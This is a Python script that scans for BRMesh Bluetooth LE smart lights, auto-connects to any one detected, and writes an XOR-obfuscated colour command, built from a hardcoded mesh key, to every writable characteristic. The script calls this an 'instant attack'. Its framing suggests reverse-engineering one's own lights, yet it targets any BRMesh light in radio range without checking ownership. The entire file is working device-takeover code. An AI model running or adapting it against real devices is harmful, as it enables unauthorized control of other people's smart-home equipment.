"""
Continuous monitoring for BRMesh lights with instant connection
Runs in background, watching for any BRMesh broadcasts
"""
import asyncio
from bleak import BleakScanner, BleakClient
from datetime import datetime

MESH_KEY = bytes.fromhex('30323336')
TARGET_FOUND = None
LAST_SEEN = {}

def xor_encrypt(key, data):
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    return bytes(result)

def generate_color_command(red, green, blue, white):
    header = bytes([0x06, 0x0c, 0x00, 0xff, 0xff, 0xff, 0xff])
    payload = bytes([red, green, blue, white, 0x00, 0x00, 0x00, 0x06])
    magic = bytes.fromhex('c47b365e')
    encrypted_header = xor_encrypt(magic, header)
    encrypted_payload = xor_encrypt(MESH_KEY, payload)
    return encrypted_header + encrypted_payload

async def try_attack_light(address):
    """Immediately try to attack the light"""
    print(f"\n{'='*70}")
    print(f"⚡ INSTANT ATTACK ON {address}")
    print(f"{'='*70}")
    
    try:
        async with BleakClient(address, timeout=10) as client:
            print(f"✅ CONNECTED!")
            
            # Find ALL writable characteristics
            write_chars = []
            for service in client.services:
                for char in service.characteristics:
                    if "write" in char.properties or "write-without-response" in char.properties:
                        write_chars.append((char.uuid, service.uuid, char.properties))
                        print(f"📝 Found writable: {char.uuid} in service {service.uuid}")
            
            if not write_chars:
                print("❌ No writable characteristics found!")
                return
            
            # Try each writable characteristic with RED command
            red_cmd = generate_color_command(255, 0, 0, 0)
            print(f"\n🎨 Trying RED command on all writable characteristics...")
            print(f"   Command: {red_cmd.hex()}")
            
            for char_uuid, svc_uuid, props in write_chars:
                try:
                    print(f"\n   Trying {char_uuid}...")
                    
                    # Use write-without-response if available
                    if "write-without-response" in props:
                        await client.write_gatt_char(char_uuid, red_cmd, response=False)
                        print(f"      ✅ Sent (no response)!")
                    else:
                        await client.write_gatt_char(char_uuid, red_cmd, response=True)
                        print(f"      ✅ Sent (with response)!")
                    
                    await asyncio.sleep(0.5)
                    
                except Exception as e:
                    print(f"      ❌ Failed: {e}")
            
            print(f"\n{'='*70}")
            print(f"✅ ATTACK COMPLETE - Check if light turned RED!")
            print(f"{'='*70}")
            
    except Exception as e:
        print(f"❌ Connection failed: {e}")

def detection_callback(device, advertisement_data):
    """Called for every BLE advertisement received"""
    if advertisement_data.manufacturer_data:
        for mfr_id, data in advertisement_data.manufacturer_data.items():
            if mfr_id == 0xfff0 and len(data) == 24:
                global TARGET_FOUND, LAST_SEEN
                
                now = datetime.now()
                addr = device.address
                
                # Track this device
                if addr not in LAST_SEEN:
                    print(f"\n⭐ NEW BRMESH LIGHT DETECTED: {addr}")
                    print(f"   Time: {now.strftime('%H:%M:%S.%f')[:-3]}")
                    print(f"   RSSI: {advertisement_data.rssi} dBm")
                    print(f"   Data: {data.hex()}")
                    TARGET_FOUND = addr
                else:
                    # Update with fresh broadcast
                    time_since_last = (now - LAST_SEEN[addr]).total_seconds()
                    if time_since_last > 2:  # Log if more than 2 seconds since last
                        print(f"   📡 {addr} broadcasting again (RSSI: {advertisement_data.rssi})")
                
                LAST_SEEN[addr] = now

async def monitor_and_attack():
    """Continuous monitoring with instant attack on detection"""
    print("="*70)
    print("🎯 BRMESH CONTINUOUS ATTACK MONITOR")
    print("="*70)
    print("\n📡 SCANNING CONTINUOUSLY FOR BRMESH LIGHTS...")
    print("🎮 CONTROL YOUR LIGHTS WITH YOUR PHONE NOW!")
    print("\nWhen a BRMesh light is detected, will IMMEDIATELY attack it.")
    print("Press Ctrl+C to stop.\n")
    print("="*70)
    
    scanner = BleakScanner(detection_callback=detection_callback)
    
    try:
        await scanner.start()
        print("✅ Scanner started, monitoring for BRMesh broadcasts...\n")
        
        # Monitor for 60 seconds
        for i in range(60):
            await asyncio.sleep(1)
            
            # If we found a target, attack it!
            global TARGET_FOUND
            if TARGET_FOUND:
                target = TARGET_FOUND
                TARGET_FOUND = None  # Reset
                
                print(f"\n🚨 ATTACKING {target} NOW!")
                await scanner.stop()
                await try_attack_light(target)
                
                # Resume scanning
                print(f"\n📡 Resuming scan...")
                await scanner.start()
        
        await scanner.stop()
        print("\n⏰ 60 second monitoring complete.")
        
    except KeyboardInterrupt:
        print("\n\n⚠️  Stopping scanner...")
        await scanner.stop()
        print("✅ Stopped.")

if __name__ == "__main__":
    asyncio.run(monitor_and_attack())
